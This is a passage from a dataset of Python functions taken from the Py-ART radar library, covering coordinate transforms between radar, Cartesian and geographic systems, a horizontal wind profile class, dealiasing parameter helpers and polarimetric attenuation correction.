    edges[0] = (np.angle(azimuths[0], deg=True) - half_angle) % 360.0
    half_angle = _half_angle_complex(azimuths[-1], azimuths[-2])
    edges[-1] = (np.angle(azimuths[-1], deg=True) + half_angle) % 360.0
    edges[edges < 0] += 360
    return edges"
ARM-DOE/pyart,_half_angle_complex,"def _half_angle_complex(complex_angle1, complex_angle2):
    """"""
    Return half the angle between complex numbers on the unit circle.

    Parameters
    ----------
    complex_angle1, complex_angle2 : complex
        Complex numbers representing unit vectors on the unit circle

    Returns
    -------
    half_angle : float
        Half the angle between the unit vectors in degrees.

    """"""
    dot_product = np.real(complex_angle1 * np.conj(complex_angle2))
    if dot_product > 1:
        warnings.warn('dot_product is larger than one.')
        dot_product = 1.0
    full_angle_rad = np.arccos(dot_product)
    half_angle_rad = full_angle_rad / 2.0
    half_angle_deg = np.rad2deg(half_angle_rad)
    return half_angle_deg"
ARM-DOE/pyart,_interpolate_axes_edges,"def _interpolate_axes_edges(axes):
    """"""Interpolate the edges of the axes gates from their centers.""""""
    edges = np.empty((axes.shape[0] + 1,), dtype=axes.dtype)
    edges[1:-1] = (axes[:-1] + axes[1:]) / 2.0
    edges[0] = axes[0] - (axes[1] - axes[0]) / 2.0
    edges[-1] = axes[-1] - (axes[-2] - axes[-1]) / 2.0
    return edges"
ARM-DOE/pyart,antenna_to_cartesian_track_relative,"def antenna_to_cartesian_track_relative(ranges, rot, roll, drift, tilt, pitch):
    """"""
    Calculate track-relative Cartesian coordinates from radar coordinates.

    Parameters
    ----------
    ranges : array
        Distances to the center of the radar gates (bins) in kilometers.
    rot : array
        Rotation angle of the radar in degrees.
    roll : array
        Roll angle of the radar in degrees.
    drift : array
        Drift angle of the radar in degrees.
    tilt : array
        Tilt angle of the radar in degrees.
    pitch : array
        Pitch angle of the radar in degrees.

    Returns
    -------
    x, y, z : array
        Cartesian coordinates in meters from the radar.

    Notes
    -----
    Project native (polar) coordinate radar sweep data onto
    track-relative Cartesian coordinate grid.

    References
    ----------
    .. [1] Lee et al. (1994) Journal of Atmospheric and Oceanic Technology.

    """"""
    rot = np.radians(rot)
    roll = np.radians(roll)
    drift = np.radians(drift)
    tilt = np.radians(tilt)
    pitch = np.radians(pitch)
    r = ranges * 1000.0
    x = r * (np.cos(rot + roll) * np.sin(drift) * np.cos(tilt) * np.sin(pitch) + np.cos(drift) * np.sin(rot + roll) * np.cos(tilt) - np.sin(drift) * np.cos(pitch) * np.sin(tilt))
    y = r * (-1.0 * np.cos(rot + roll) * np.cos(drift) * np.cos(tilt) * np.sin(pitch) + np.sin(drift) * np.sin(rot + roll) * np.cos(tilt) + np.cos(drift) * np.cos(pitch) * np.sin(tilt))
    z = r * np.cos(pitch) * np.cos(tilt) * np.cos(rot + roll) + np.sin(pitch) * np.sin(tilt)
    return (x, y, z)"
ARM-DOE/pyart,antenna_to_cartesian_earth_relative,"def antenna_to_cartesian_earth_relative(ranges, rot, roll, heading, tilt, pitch):
    """"""
    Calculate earth-relative Cartesian coordinates from radar coordinates

    Parameters
    ----------
    ranges : array
        Distances to the center of the radar gates (bins) in kilometers.
    rot : array
        Rotation angle of the radar in degrees.
    roll : array
        Roll angle of the radar in degrees.
    heading : array
        Heading (compass) angle of the radar in degrees clockwise from north.
    tilt : array
        Tilt angle of the radar in degrees.
    pitch : array
        Pitch angle of the radar in degrees.

    Returns
    -------
    x, y, z : array
        Cartesian coordinates in meters from the radar.

    Notes
    -----
    Project native (polar) coordinate radar sweep data onto
    earth-relative Cartesian coordinate grid.

    References
    ----------
    .. [1] Lee et al. (1994) Journal of Atmospheric and Oceanic Technology.

    """"""
    rot = np.radians(rot)
    roll = np.radians(roll)
    heading = np.radians(heading)
    tilt = np.radians(tilt)
    pitch = np.radians(pitch)
    r = ranges * 1000.0
    x = r * (-1.0 * np.cos(rot + roll) * np.sin(heading) * np.cos(tilt) * np.sin(pitch) + np.cos(heading) * np.sin(rot + roll) * np.cos(tilt) + np.sin(heading) * np.cos(pitch) * np.sin(tilt))
    y = r * (-1.0 * np.cos(rot + roll) * np.cos(heading) * np.cos(tilt) * np.sin(pitch) - np.sin(heading) * np.sin(rot + roll) * np.cos(tilt) + np.cos(heading) * np.cos(pitch) * np.sin(tilt))
    z = r * np.cos(pitch) * np.cos(tilt) * np.cos(rot + roll) + np.sin(pitch) * np.sin(tilt)
    return (x, y, z)"
ARM-DOE/pyart,antenna_to_cartesian_aircraft_relative,"def antenna_to_cartesian_aircraft_relative(ranges, rot, tilt):
    """"""
    Calculate aircraft-relative Cartesian coordinates from radar coordinates.

    Parameters
    ----------
    ranges : array
        Distances to the center of the radar gates (bins) in kilometers.
    rot : array
        Rotation angle of the radar in degrees.
    tilt : array
        Tilt angle of the radar in degrees.

    Returns
    -------
    X, Y, Z : array
        Cartesian coordinates in meters from the radar.

    Notes
    -----
    Project native (polar) coordinate radar sweep data onto
    earth-relative Cartesian coordinate grid.

    References
    ----------
    .. [1] Lee et al. (1994) Journal of Atmospheric and Oceanic Technology.

    """"""
    rot = np.radians(rot)
    tilt = np.radians(tilt)
    r = ranges * 1000.0
    x = r * np.cos(tilt) * np.sin(rot)
    y = r * np.sin(tilt)
    z = r * np.cos(rot) * np.cos(tilt)
    return (x, y, z)"
ARM-DOE/pyart,geographic_to_cartesian,"def geographic_to_cartesian(lon, lat, projparams):
    """"""
    Geographic to Cartesian coordinate transform.

    Transform a set of Geographic coordinate (lat, lon) to a
    Cartesian/Cartographic coordinate (x, y) using pyproj or a build in
    Azimuthal equidistant projection.

    Parameters
    ----------
    lon, lat : array-like
        Geographic coordinates in degrees.
    projparams : dict or str
        Projection parameters passed to pyproj.Proj. If this parameter is a
        dictionary with a 'proj' key equal to 'pyart_aeqd' then a azimuthal
        equidistant projection will be used that is native to Py-ART and
        does not require pyproj to be installed. In this case a non-default
        value of R can be specified by setting the 'R' key to the desired
        value.

    Returns
    -------
    x, y : array-like
        Cartesian coordinates in meters unless projparams defines a value for R
        in different units.

    """"""
    if isinstance(projparams, dict) and projparams.get('proj') == 'pyart_aeqd':
        lon_0 = projparams['lon_0']
        lat_0 = projparams['lat_0']
        if 'R' in projparams:
            R = projparams['R']
            (x, y) = geographic_to_cartesian_aeqd(lon, lat, lon_0, lat_0, R)
        else:
            (x, y) = geographic_to_cartesian_aeqd(lon, lat, lon_0, lat_0)
    else:
        if not _PYPROJ_AVAILABLE:
            raise MissingOptionalDependency('PyProj is required to use geographic_to_cartesian with a projection other than pyart_aeqd but it is not installed')
        proj = pyproj.Proj(projparams)
        (x, y) = proj(lon, lat, inverse=False)
    return (x, y)"
ARM-DOE/pyart,geographic_to_cartesian_aeqd,"def geographic_to_cartesian_aeqd(lon, lat, lon_0, lat_0, R=6370997.0):
    """"""
    Azimuthal equidistant geographic to Cartesian coordinate transform.

    Transform a set of geographic coordinates (lat, lon) to
    Cartesian/Cartographic coordinates (x, y) using a azimuthal equidistant
    map projection [1]_.

    .. math::

        x = R * k * \\cos(lat) * \\sin(lon - lon_0)

        y = R * k * [\\cos(lat_0) * \\sin(lat) -
                     \\sin(lat_0) * \\cos(lat) * \\cos(lon - lon_0)]

        k = c / \\sin(c)

        c = \\arccos(\\sin(lat_0) * \\sin(lat) +
                     \\cos(lat_0) * \\cos(lat) * \\cos(lon - lon_0))

    Where x, y are the Cartesian position from the center of projection;
    lat, lon the corresponding latitude and longitude; lat_0, lon_0 are the
    latitude and longitude of the center of the projection; R is the radius of
    the earth (defaults to ~6371 km).

    Parameters
    ----------
    lon, lat : array-like
        Longitude and latitude coordinates in degrees.
    lon_0, lat_0 : float
        Longitude and latitude, in degrees, of the center of the projection.
    R : float, optional
        Earth radius in the same units as x and y. The default value is in
        units of meters.

    Returns
    -------
    x, y : array
        Cartesian coordinates in the same units as R, typically meters.

    References
    ----------
    .. [1] Snyder, J. P. Map Projections--A Working Manual. U. S. Geological
        Survey Professional Paper 1395, 1987, pp. 191-202.

    """"""
    lon = np.atleast_1d(np.asarray(lon))
    lat = np.atleast_1d(np.asarray(lat))
    lon_rad = np.deg2rad(lon)
    lat_rad = np.deg2rad(lat)
    lat_0_rad = np.deg2rad(lat_0)
    lon_0_rad = np.deg2rad(lon_0)
    lon_diff_rad = lon_rad - lon_0_rad
    arg_arccos = np.sin(lat_0_rad) * np.sin(lat_rad) + np.cos(lat_0_rad) * np.cos(lat_rad) * np.cos(lon_diff_rad)
    arg_arccos[arg_arccos > 1] = 1
    arg_arccos[arg_arccos < -1] = -1
    c = np.arccos(arg_arccos)
    with warnings.catch_warnings():
        warnings.simplefilter('ignore', RuntimeWarning)
        k = c / np.sin(c)
    k[c == 0] = 1
    x = R * k * np.cos(lat_rad) * np.sin(lon_diff_rad)
    y = R * k * (np.cos(lat_0_rad) * np.sin(lat_rad) - np.sin(lat_0_rad) * np.cos(lat_rad) * np.cos(lon_diff_rad))
    return (x, y)"
ARM-DOE/pyart,cartesian_to_geographic,"def cartesian_to_geographic(x, y, projparams):
    """"""
    Cartesian to Geographic coordinate transform.

    Transform a set of Cartesian/Cartographic coordinates (x, y) to a
    geographic coordinate system (lat, lon) using pyproj or a build in
    Azimuthal equidistant projection.

    Parameters
    ----------
    x, y : array-like
        Cartesian coordinates in meters unless R is defined in different units
        in the projparams parameter.
    projparams : dict or str
        Projection parameters passed to pyproj.Proj. If this parameter is a
        dictionary with a 'proj' key equal to 'pyart_aeqd' then a azimuthal
        equidistant projection will be used that is native to Py-ART and
        does not require pyproj to be installed. In this case a non-default
        value of R can be specified by setting the 'R' key to the desired
        value.

    Returns
    -------
    lon, lat : array
        Longitude and latitude of the Cartesian coordinates in degrees.

    """"""
    if isinstance(projparams, dict) and projparams.get('proj') == 'pyart_aeqd':
        lon_0 = projparams['lon_0']
        lat_0 = projparams['lat_0']
        if 'R' in projparams:
            R = projparams['R']
            (lon, lat) = cartesian_to_geographic_aeqd(x, y, lon_0, lat_0, R)
        else:
            (lon, lat) = cartesian_to_geographic_aeqd(x, y, lon_0, lat_0)
    else:
        if not _PYPROJ_AVAILABLE:
            raise MissingOptionalDependency('PyProj is required to use cartesian_to_geographic with a projection other than pyart_aeqd but it is not installed')
        proj = pyproj.Proj(projparams)
        (lon, lat) = proj(x, y, inverse=True)
    return (lon, lat)"
ARM-DOE/pyart,cartesian_vectors_to_geographic,"def cartesian_vectors_to_geographic(x, y, projparams, edges=False):
    """"""
    Cartesian vectors to Geographic coordinate transform.

    Transform a set of Cartesian/Cartographic coordinate vectors (x, y) to a
    geographic coordinate system (lat, lon) using pyproj or a build in
    Azimuthal equidistant projection finding the coordinates edges in
    Cartesian space if requested.

    Parameters
    ----------
    x, y : array 1D.
        Cartesian coordinate vectors in meters unless R is defined in
        different units in the projparams parameter.
    projparams : dict or str
        Projection parameters passed to pyproj.Proj. If this parameter is a
        dictionary with a 'proj' key equal to 'pyart_aeqd' then a azimuthal
        equidistant projection will be used that is native to Py-ART and
        does not require pyproj to be installed. In this case a
        non-default value of R can be specified by setting the 'R' key to the
        desired value.
    edges : bool, optional
        True to calculate the coordinates of the geographic edges by
        interpolating between Cartesian points and extrapolating at the
        boundaries. False to calculate the coordinate centers.

    Returns
    -------
    lon, lat : array
        Longitude and latitude of the Cartesian coordinates in degrees.

    """"""
    if edges:
        if len(x) > 1:
            x = _interpolate_axes_edges(x)
        if len(y) > 1:
            y = _interpolate_axes_edges(y)
    (x, y) = np.meshgrid(x, y)
    return cartesian_to_geographic(x, y, projparams)"
ARM-DOE/pyart,cartesian_to_geographic_aeqd,"def cartesian_to_geographic_aeqd(x, y, lon_0, lat_0, R=6370997.0):
    """"""
    Azimuthal equidistant Cartesian to geographic coordinate transform.

    Transform a set of Cartesian/Cartographic coordinates (x, y) to
    geographic coordinate system (lat, lon) using a azimuthal equidistant
    map projection [1]_.

    .. math::

        lat = \\arcsin(\\cos(c) * \\sin(lat_0) +
                       (y * \\sin(c) * \\cos(lat_0) / \\rho))

        lon = lon_0 + \\arctan2(
            x * \\sin(c),
            \\rho * \\cos(lat_0) * \\cos(c) - y * \\sin(lat_0) * \\sin(c))

        \\rho = \\sqrt(x^2 + y^2)

        c = \\rho / R

    Where x, y are the Cartesian position from the center of projection;
    lat, lon the corresponding latitude and longitude; lat_0, lon_0 are the
    latitude and longitude of the center of the projection; R is the radius of
    the earth (defaults to ~6371 km). lon is adjusted to be between -180 and
    180.

    Parameters
    ----------
    x, y : array-like
        Cartesian coordinates in the same units as R, typically meters.
    lon_0, lat_0 : float
        Longitude and latitude, in degrees, of the center of the projection.
    R : float, optional
        Earth radius in the same units as x and y. The default value is in
        units of meters.

    Returns
    -------
    lon, lat : array
        Longitude and latitude of Cartesian coordinates in degrees.

    References
    ----------
    .. [1] Snyder, J. P. Map Projections--A Working Manual. U. S. Geological
        Survey Professional Paper 1395, 1987, pp. 191-202.

    """"""
    x = np.atleast_1d(np.asarray(x))
    y = np.atleast_1d(np.asarray(y))
    lat_0_rad = np.deg2rad(lat_0)
    lon_0_rad = np.deg2rad(lon_0)
    rho = np.sqrt(x * x + y * y)
    c = rho / R
    with warnings.catch_warnings():
        warnings.simplefilter('ignore', RuntimeWarning)
        lat_rad = np.arcsin(np.cos(c) * np.sin(lat_0_rad) + y * np.sin(c) * np.cos(lat_0_rad) / rho)
    lat_deg = np.rad2deg(lat_rad)
    lat_deg[rho == 0] = lat_0
    x1 = x * np.sin(c)
    x2 = rho * np.cos(lat_0_rad) * np.cos(c) - y * np.sin(lat_0_rad) * np.sin(c)
    lon_rad = lon_0_rad + np.arctan2(x1, x2)
    lon_deg = np.rad2deg(lon_rad)
    lon_deg[lon_deg > 180] -= 360.0
    lon_deg[lon_deg < -180] += 360.0
    return (lon_deg, lat_deg)"
ARM-DOE/pyart,__init__,"def __init__(self, height, speed, direction, latitude=None, longitude=None):
    """"""initialize""""""
    if len(height) != len(speed) or len(height) != len(direction):
        raise ValueError('Wind parameters must have the same length.')
    self.height = np.asanyarray(height)
    self.speed = np.asanyarray(speed)
    self.direction = np.asanyarray(direction)
    self._parse_location_data(latitude, longitude)"
ARM-DOE/pyart,from_u_and_v,"@classmethod
def from_u_and_v(cls, height, u_wind, v_wind):
    """"""
        Create a HorizontalWindProfile instance from U and V components.

        Parameters
        ----------
        height : array-like, 1D
            Heights in meters above sea level at which horizontal winds were
            sampled.
        u_wind : array-like, 1D
            U component of horizontal wind speed in meters per second.
        v_wind : array-like, 1D
            V component of horizontal wind speed in meters per second.

        """"""
    u_wind = np.asanyarray(u_wind)
    v_wind = np.asanyarray(v_wind)
    speed = np.sqrt(u_wind * u_wind + v_wind * v_wind)
    direction = np.rad2deg(np.arctan2(-u_wind, -v_wind))
    direction[direction < 0] += 360
    return cls(height, speed, direction)"
ARM-DOE/pyart,u_wind,"@property
def u_wind(self):
    """"""U component of horizontal wind in meters per second.""""""
    u_wind = -np.sin(np.deg2rad(self.direction)) * self.speed
    return u_wind"
ARM-DOE/pyart,v_wind,"@property
def v_wind(self):
    """"""V component of horizontal wind in meters per second.""""""
    v_wind = -np.cos(np.deg2rad(self.direction)) * self.speed
    return v_wind"
ARM-DOE/pyart,_parse_location_data,"def _parse_location_data(self, latitude, longitude):
    """"""Parse profile location data.""""""
    if latitude is not None:
        if len(self.height) != len(latitude):
            raise ValueError('Latitude data must have same length.')
        self.latitude = np.asanyarray(latitude)
    if longitude is not None:
        if len(self.height) != len(longitude):
            raise ValueError('Longitude data must have same length.')
        self.longitude = np.asanyarray(longitude)"
ARM-DOE/pyart,_parse_fields,"def _parse_fields(vel_field, corr_vel_field):
    """"""Parse and return the radar fields for dealiasing.""""""
    if vel_field is None:
        vel_field = get_field_name('velocity')
    if corr_vel_field is None:
        corr_vel_field = get_field_name('corrected_velocity')
    return (vel_field, corr_vel_field)"
ARM-DOE/pyart,_parse_nyquist_vel,"def _parse_nyquist_vel(nyquist_vel, radar, check_uniform):
    """"""Parse the nyquist_vel parameter, extract from the radar if needed.""""""
    if nyquist_vel is None:
        nyquist_vel = [radar.get_nyquist_vel(i, check_uniform) for i in range(radar.nsweeps)]
    else:
        try:
            len(nyquist_vel)
        except TypeError:
            nyquist_vel = [nyquist_vel for i in range(radar.nsweeps)]
    return nyquist_vel"
ARM-DOE/pyart,_parse_gatefilter,"def _parse_gatefilter(gatefilter, radar, **kwargs):
    """"""Parse the gatefilter, return a valid GateFilter object.""""""
    if gatefilter is None:
        gatefilter = moment_based_gate_filter(radar, **kwargs)
    elif gatefilter is False:
        gatefilter = GateFilter(radar)
    else:
        gatefilter = gatefilter.copy()
    return gatefilter"
ARM-DOE/pyart,_parse_rays_wrap_around,"def _parse_rays_wrap_around(rays_wrap_around, radar):
    """"""Parse the rays_wrap_around parameter.""""""
    if rays_wrap_around is None:
        if radar.scan_type == 'ppi':
            rays_wrap_around = True
        else:
            rays_wrap_around = False
    return rays_wrap_around"
ARM-DOE/pyart,_set_limits,"def _set_limits(data, nyquist_vel, dic):
    """"""Set the valid_min and valid_max keys in dic from dealiased data.""""""
    max_abs_vel = np.ma.max(np.ma.abs(data))
    if max_abs_vel is np.ma.masked:
        return
    max_nyq_vel = np.ma.max(nyquist_vel)
    max_nyq_int = 2.0 * max_nyq_vel
    added_intervals = np.ceil((max_abs_vel - max_nyq_vel) / max_nyq_int)
    max_valid_velocity = max_nyq_vel + added_intervals * max_nyq_int
    dic['valid_min'] = float(-max_valid_velocity)
    dic['valid_max'] = float(max_valid_velocity)
    return"
ARM-DOE/pyart,calculate_attenuation_zphi,"def calculate_attenuation_zphi(radar, doc=None, fzl=None, smooth_window_len=5, gatefilter=None, a_coef=None, beta=None, c=None, d=None, refl_field=None, phidp_field=None, zdr_field=None, temp_field=None, iso0_field=None, spec_at_field=None, pia_field=None, corr_refl_field=None, spec_diff_at_field=None, pida_field=None, corr_zdr_field=None, temp_ref='temperature'):
    """"""
    Calculate the attenuation and the differential attenuation from a
    polarimetric radar using Z-PHI method..
    The attenuation is computed up to a user defined freezing level height
    or up to where temperatures in a temperature field are positive.
    The coefficients are either user-defined or radar frequency dependent.

    Parameters
    ----------
    radar : Radar
        Radar object to use for attenuation calculations. Must have
        phidp and refl fields.
    doc : float, optional
        Number of gates at the end of each ray to to remove from the
        calculation.
    fzl : float, optional
        Freezing layer, gates above this point are not included in the
        correction.
    gatefilter : GateFilter, optional
        The gates to exclude from the calculation. This, combined with
        the gates above fzl, will be excluded from the correction. Set to
        None to not use a gatefilter.
    smooth_window_len : int, optional
        Size, in range bins, of the smoothing window
    a_coef : float, optional
        A coefficient in attenuation calculation.
    beta : float, optional
        Beta parameter in attenuation calculation.
    c, d : float, optional
        coefficient and exponent of the power law that relates attenuation
        with differential attenuation
    refl_field : str, optional
        Name of the reflectivity field used for the attenuation correction.
        A value of None for any of these parameters will use the default
        field name as defined in the Py-ART configuration file.
    phidp_field : str, optional
        Name of the differential phase field used for the attenuation
        correction. A value of None for any of these parameters will use the
        default field name as defined in the Py-ART configuration file.
    zdr_field : str, optional
        Name of the differential reflectivity field used for the attenuation
        correction. A value of None for any of these parameters will use the
        default field name as defined in the Py-ART configuration file. This
        will only be used if it is available.
    temp_field : str, optional
        Name of the temperature field used for the attenuation
        correction. A value of None for any of these parameters will use the
        default field name as defined in the Py-ART configuration file.
    iso0_field : str, optional
        Name of the field for the height above the 0C isotherm for the
        attenuation correction. A value of None for any of these parameters
        will use the default field name as defined in the Py-ART configuration
        file. This will only be used if it is available.
    spec_at_field : str, optional
        Name of the specific attenuation field that will be used to fill in
        the metadata for the returned fields. A value of None for any of these
        parameters will use the default field names as defined in the Py-ART
        configuration file.
    pia_field : str, optional
        Name of the path integrated attenuation field that will be used to fill
        in the metadata for the returned fields. A value of None for any of
        these parameters will use the default field names as defined in the
        Py-ART configuration file.
    corr_refl_field : str, optional
        Name of the corrected reflectivity field that will be used to fill in
        the metadata for the returned fields. A value of None for any of these
        parameters will use the default field names as defined in the Py-ART
        configuration file.
    spec_diff_at_field : str, optional
        Name of the specific differential attenuation field that will be used
        to fill in the metadata for the returned fields. A value of None for
        any of these parameters will use the default field names as defined
        in the Py-ART configuration file. This will only be calculated if ZDR
        is available.
    pida_field : str, optional
        Name of the path integrated differential attenuation field that will
        be used to fill in the metadata for the returned fields. A value of
        None for any of these parameters will use the default field names as
        defined in the Py-ART configuration file. This will only be calculated
        if ZDR is available.
    corr_zdr_field : str, optional
        Name of the corrected differential reflectivity field that will
        be used to fill in the metadata for the returned fields. A value of
        None for any of these parameters will use the default field names as
        defined in the Py-ART configuration file. This will only be calculated
        if ZDR is available.
    temp_ref : str, optional
        the field use as reference for temperature. Can be either temperature,
        height_over_iso0 or fixed_fzl

    Returns
    -------
    spec_at : dict
        Field dictionary containing the specific attenuation.
    pia_dict : dict
        Field dictionary containing the path integrated attenuation.
    cor_z : dict
        Field dictionary containing the corrected reflectivity.
    spec_diff_at : dict
        Field dictionary containing the specific differential attenuation.
    pida_dict : dict
        Field dictionary containing the path integrated differential
        attenuation.
    cor_zdr : dict
        Field dictionary containing the corrected differential reflectivity.

    References
    ----------
    Gu et al. Polarimetric Attenuation Correction in Heavy Rain at C Band,
    JAMC, 2011, 50, 39-58.

    Ryzhkov et al. Potential Utilization of Specific Attenuation for Rainfall
    Estimation, Mitigation of Partial Beam Blockage, and Radar Networking,
    JAOT, 2014, 31, 599-619.

    """"""
    if a_coef is None or beta is None or c is None or (d is None):
        if 'frequency' in radar.instrument_parameters:
            (a_coef, beta, c, d) = _get_param_attzphi(radar.instrument_parameters['frequency']['data'][0])
        else:
            (a_coef, beta, c, d) = _param_attzphi_table()['C']
            warn('Radar frequency unknown. Default coefficients for C band will be applied.')
    if refl_field is None:
        refl_field = get_field_name('reflectivity')
    if zdr_field is None:
        zdr_field = get_field_name('differential_reflectivity')
    if phidp_field is None:
        phidp_field = get_field_name('corrected_differential_phase')
        if phidp_field not in radar.fields:
            phidp_field = get_field_name('unfolded_differential_phase')
        if phidp_field not in radar.fields:
            phidp_field = get_field_name('differential_phase')
    if spec_at_field is None:
        spec_at_field = get_field_name('specific_attenuation')
    if pia_field is None:
        pia_field = get_field_name('path_integrated_attenuation')
    if corr_refl_field is None:
        corr_refl_field = get_field_name('corrected_reflectivity')
    if spec_diff_at_field is None:
        spec_diff_at_field = get_field_name('specific_differential_attenuation')
    if pida_field is None:
        pida_field = get_field_name('path_integrated_differential_attenuation')
    if corr_zdr_field is None:
        corr_zdr_field = get_field_name('corrected_differential_reflectivity')
    if temp_ref == 'temperature':
        if temp_field is None:
            temp_field = get_field_name('temperature')
    elif temp_ref == 'height_over_iso0':
        if iso0_field is None:
            iso0_field = get_field_name('height_over_iso0')
    radar.check_field_exists(refl_field)
    refl = radar.fields[refl_field]['data']
    radar.check_field_exists(phidp_field)
    phidp = deepcopy(radar.fields[phidp_field]['data'])
    ah = np.ma.zeros(refl.shape, dtype='float64')
    pia = np.ma.zeros(refl.shape, dtype='float64')
    try:
        radar.check_field_exists(zdr_field)
        zdr = radar.fields[zdr_field]['data']
        adiff = np.ma.zeros(zdr.shape, dtype='float64')
        pida = np.ma.zeros(zdr.shape, dtype='float64')
    except KeyError:
        zdr = None
    (mask_fzl, end_gate_arr) = get_mask_fzl(radar, fzl=fzl, doc=doc, min_temp=0, max_h_iso0=0.0, thickness=None, beamwidth=None, temp_field=temp_field, iso0_field=iso0_field, temp_ref=temp_ref)
    if gatefilter is None:
        mask = np.ma.getmaskarray(refl)
    else:
        mask = gatefilter.gate_excluded
        mask_fzl = np.logical_or(mask, mask_fzl)
    corr_phidp = _prepare_phidp(phidp, mask_fzl)
    init_refl_correct = refl + corr_phidp * a_coef
    dr = (radar.range['data'][1] - radar.range['data'][0]) / 1000.0
    if smooth_window_len > 0:
        sm_refl = smooth_masked(init_refl_correct, wind_len=smooth_window_len, min_valid=1, wind_type='mean')
    else:
        sm_refl = init_refl_correct
    refl_linear = np.ma.power(10.0, 0.1 * beta * sm_refl).filled(fill_value=0)
    for ray in range(radar.nrays):
        if end_gate_arr[ray] < 0:
            continue
        if end_gate_arr[ray] > smooth_window_len:
            ray_phase_shift = corr_phidp[ray, 0:end_gate_arr[ray]]
            ray_mask = mask[ray, 0:end_gate_arr[ray]]
            ray_refl_linear = refl_linear[ray, 0:end_gate_arr[ray]]
            last_six_good = np.where(np.ndarray.flatten(ray_mask) == 0)[0][-6:]
            if len(last_six_good) == 6:
                phidp_max = np.median(ray_phase_shift[last_six_good])
                self_cons_number = 10.0 ** (0.1 * beta * a_coef * phidp_max) - 1.0
                I_indef = cumtrapz(0.46 * beta * dr * ray_refl_linear[::-1])
                I_indef = np.append(I_indef, I_indef[-1])[::-1]
                ah[ray, 0:end_gate_arr[ray]] = ray_refl_linear * self_cons_number / (I_indef[0] + self_cons_number * I_indef)
                pia[ray, :-1] = cumtrapz(ah[ray, :]) * dr * 2.0
                pia[ray, -1] = pia[ray, -2]
                if zdr is not None:
                    adiff[ray, 0:end_gate_arr[ray]] = c * np.ma.power(ah[ray, 0:end_gate_arr[ray]], d)
                    pida[ray, :-1] = cumtrapz(adiff[ray, :]) * dr * 2.0
                    pida[ray, -1] = pida[ray, -2]
    spec_at = get_metadata(spec_at_field)
    temp_array = np.ma.masked_where(mask, ah)
    spec_at['data'] = temp_array
    spec_at['_FillValue'] = temp_array.fill_value
    pia_array = np.ma.masked_where(mask, pia)
    pia_dict = get_metadata(pia_field)
    pia_dict['data'] = pia_array
    pia_dict['_FillValue'] = pia_array.fill_value
    cor_z = get_metadata(corr_refl_field)
    cor_z_array = np.ma.masked_where(mask, pia + refl)
    cor_z['data'] = cor_z_array
    cor_z['_FillValue'] = cor_z_array.fill_value
    if zdr is not None:
        sda = np.ma.masked_where(mask, adiff)
        spec_diff_at = get_metadata(spec_diff_at_field)
        spec_diff_at['data'] = sda
        spec_diff_at['_FillValue'] = sda.fill_value
        pida_array = np.ma.masked_where(mask, pida)
        pida_dict = get_metadata(pida_field)
        pida_dict['data'] = pida_array
        pida_dict['_FillValue'] = pida_array.fill_value
        cor_zdr = get_metadata(corr_zdr_field)
        czdr = np.ma.masked_where(mask, pida + zdr)
        cor_zdr['data'] = czdr
        cor_zdr['_FillValue'] = czdr.fill_value
    else:
        spec_diff_at = None
        cor_zdr = None
        pida_dict = None
    return (spec_at, pia_dict, cor_z, spec_diff_at, pida_dict, cor_zdr)"
ARM-DOE/pyart,calculate_attenuation_philinear,"def calculate_attenuation_philinear(radar, doc=None, fzl=None, pia_coef=None, gatefilter=None, pida_coef=None, refl_field=None, phidp_field=None, zdr_field=None, temp_field=None, iso0_field=None, spec_at_field=None, pia_field=None, corr_refl_field=None, spec_diff_at_field=None, pida_field=None, corr_zdr_field=None, temp_ref='temperature'):
    """"""
    Calculate the attenuation and the differential attenuation from a
    polarimetric radar using linear dependece with PhiDP.
    The attenuation is computed up to a user defined freezing level height,
    where temperatures in a temperature field are positive or where the height
    relative to the iso0 is 0.
    The coefficients are either user-defined or radar frequency dependent.

    Parameters
    ----------
    radar : Radar
        Radar object to use for attenuation calculations. Must have
        phidp and refl fields.
    doc : float, optional
        Number of gates at the end of each ray to to remove from the
        calculation.
    fzl : float, optional
        Freezing layer, gates above this point are not included in the
        correction.
    gatefilter : GateFilter, optional
        The gates to exclude from the calculation. This, combined with
        the gates above fzl, will be excluded from the correction. Set to
        None to not use a gatefilter.
    pia_coef : float, optional
        Coefficient in path integrated attenuation calculation
    pida_coeff : float, optional
        Coefficient in path integrated differential attenuation calculation
    refl_field : str, optional
        Name of the reflectivity field used for the attenuation correction.
        A value of None for any of these parameters will use the default
        field name as defined in the Py-ART configuration file.
    phidp_field : str, optional
        Name of the differential phase field used for the attenuation
        correction. A value of None for any of these parameters will use the
        default field name as defined in the Py-ART configuration file.
    zdr_field : str, optional
        Name of the differential reflectivity field used for the attenuation
        correction. A value of None for any of these parameters will use the
        default field name as defined in the Py-ART configuration file. This
        will only be used if it is available.
    temp_field : str, optional
        Name of the temperature field used for the attenuation
        correction. A value of None for any of these parameters will use the
        default field name as defined in the Py-ART configuration file.
    iso0_field : str, optional
        Name of the field for the height above the 0C isotherm for the
        attenuation correction. A value of None for any of these parameters
        will use the default field name as defined in the Py-ART configuration
        file. This will only be used if it is available.
    spec_at_field : str, optional
        Name of the specific attenuation field that will be used to fill in
        the metadata for the returned fields. A value of None for any of these
        parameters will use the default field names as defined in the Py-ART
        configuration file.
    pia_field : str, optional
        Name of the path integrated attenuation field that will be used to fill
        in the metadata for the returned fields. A value of None for any of
        these parameters will use the default field names as defined in the
        Py-ART configuration file.
    corr_refl_field : str, optional
        Name of the corrected reflectivity field that will be used to fill in
        the metadata for the returned fields. A value of None for any of these
        parameters will use the default field names as defined in the Py-ART
        configuration file.
    spec_diff_at_field : str, optional
        Name of the specific differential attenuation field that will be used
        to fill in the metadata for the returned fields. A value of None for
        any of these parameters will use the default field names as defined
        in the Py-ART configuration file. This will only be calculated if ZDR
        is available.
    corr_zdr_field : str, optional
        Name of the corrected differential reflectivity field that will
        be used to fill in the metadata for the returned fields. A value of
        None for any of these parameters will use the default field names as
        defined in the Py-ART configuration file. This will only be calculated
        if ZDR is available.
    temp_ref : str, optional
        The field use as reference for temperature. Can be either temperature,
        height_over_iso0 or fixed_fzl.

    Returns
    -------
    spec_at : dict
        Field dictionary containing the specific attenuation.
    pia_dict : dict
        Field dictionary containing the path integrated attenuation.
    cor_z : dict
        Field dictionary containing the corrected reflectivity.
    spec_diff_at : dict
        Field dictionary containing the specific differential attenuation.
    pida_dict : dict
        Field dictionary containing the path integrated differential
        attenuation.
    cor_zdr : dict
        Field dictionary containing the corrected differential reflectivity.

    """"""
    if pia_coef is None or pida_coef is None:
        if 'frequency' in radar.instrument_parameters:
            (pia_coef, pida_coef) = _get_param_attphilinear(radar.instrument_parameters['frequency']['data'][0])
        else:
